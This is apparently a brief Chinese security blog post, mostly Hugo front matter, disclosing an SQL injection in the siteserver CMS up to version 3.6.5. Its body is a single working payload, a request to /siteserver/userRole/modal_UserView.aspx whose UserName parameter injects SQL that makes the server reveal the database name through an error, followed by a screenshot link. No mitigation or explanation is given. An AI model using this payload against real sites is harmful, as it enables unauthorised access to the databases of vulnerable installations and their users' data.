---
title: "siteserver SQL 注入"
date: 2018-03-10T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms','sqli']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


影响范围 siteserver <= 3.6.5

<!--more-->

**Payload**

`/siteserver/userRole/modal_UserView.aspx?UserName=a' or[areaid]>db_name()--`

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/07/1520423900.jpg)